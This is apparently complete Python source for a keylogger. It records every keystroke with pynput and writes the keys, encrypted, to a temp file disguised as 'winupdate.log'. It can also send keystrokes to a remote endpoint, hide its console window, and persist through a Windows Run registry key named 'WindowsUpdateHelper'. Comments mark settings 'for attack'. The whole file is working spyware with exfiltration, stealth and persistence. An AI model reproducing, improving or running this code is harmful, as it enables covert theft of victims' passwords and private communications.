import os
import sys
import logging
from pynput import keyboard
from datetime import datetime
import requests 
import tempfile
from cryptography.fernet import Fernet 
import json


STEALTH_MODE = True      # on during attack
PERSISTENCE = False      #dont forget to on ts!!
LOCAL_LOGGING = True     
REMOTE_LOGGING = False   # RequestBin || true for attack 
ENCRYPT_LOGS = True      

# For REMOTE_LOGGING (Demo: Use https://pipedream.com to create a free endpoint || requestbin) 
REMOTE_SERVER = "https://your-endpoint.m.pipedream.net"  #pipedream(demo only not working for now, will fix soon ig?)

LOG_FILE = os.path.join(tempfile.gettempdir(), "winupdate.log")  # Hidden log file
if ENCRYPT_LOGS:
    ENCRYPTION_KEY = Fernet.generate_key()
    cipher_suite = Fernet(ENCRYPTION_KEY)


logging.basicConfig(
    level=logging.DEBUG,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.FileHandler(os.path.join(tempfile.gettempdir(), "debug.log")),
        logging.StreamHandler()  # Print to console (disable in stealth)
    ]
)


def encrypt(data: str) -> str:
    """Encrypt log entries for security."""
    return cipher_suite.encrypt(data.encode()).decode()

def log_keystroke(key_data: str):
    """Log keystrokes locally/remotely with error handling."""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"{timestamp} - {key_data}"

    # Local logging (encrypted if enabled)
    if LOCAL_LOGGING:
        try:
            with open(LOG_FILE, "a") as f:
                f.write(encrypt(log_entry) + "\n" if ENCRYPT_LOGS else log_entry + "\n")
        except Exception as e:
            logging.error(f"Local logging failed: {e}")

   
    if REMOTE_LOGGING:
        try:
            payload = {
                "timestamp": timestamp,
                "keystroke": encrypt(key_data) if ENCRYPT_LOGS else key_data
            }
            requests.post(REMOTE_SERVER, json=payload, timeout=3)
        except Exception as e:
            logging.error(f"Remote logging failed: {e}")

def on_press(key):
    try:
        # Special keys 
        special_keys = {
            keyboard.Key.space: "[SPACE]",
            keyboard.Key.enter: "[ENTER]",
            keyboard.Key.tab: "[TAB]",
            keyboard.Key.esc: "[ESC]",
            keyboard.Key.backspace: "[BACKSPACE]"
        }
        
        if key in special_keys:
            log_keystroke(special_keys[key])
        elif hasattr(key, "char") and key.char:  # Normal keys
            log_keystroke(key.char)
        else:  # Other keys (Ctrl, Shift, etc.)
            log_keystroke(f"[{key}]")

    except Exception as e:
        logging.error(f"Key processing error: {e}")


#hides the fucking popup in windows and linux, "xdotool" would be better if possible 
def hide_console(): 
    if STEALTH_MODE:
        if os.name == "nt":
            try:
                import win32gui, win32con
                win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_HIDE)
            except ImportError:
                logging.warning("pywin32 not installed. Stealth mode disabled.")
        elif os.name == "posix":
            
            try:
                os.system("xdotool getactivewindow windowminimize")
            except Exception:
                logging.warning("xdotool not available. Stealth mode limited on Linux.")

def add_persistence():
    #persistence(add to startup) 
    if PERSISTENCE and os.name == "nt":
        try:
            import winreg
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as regkey:
                winreg.SetValueEx(
                    regkey, "WindowsUpdateHelper", 0, winreg.REG_SZ, 
                    f'"{sys.executable}" "{os.path.abspath(__file__)}"'
                )
        except Exception as e:
            logging.error(f"Persistence failed: {e}")


if __name__ == "__main__":
    
    print("""
   
    [!] WARNING:
    [*] Press CTRL+C in terminal to stop.
    """)

    hide_console()
    if PERSISTENCE:
        add_persistence()

    # Start listener
    try:
        with keyboard.Listener(on_press=on_press) as listener:
            logging.info("Keylogger started (attack!)")
            listener.join()
    except KeyboardInterrupt:
        logging.info("Keylogger stopped by user.")
    except Exception as e:
        logging.critical(f"Fatal error: {e}")

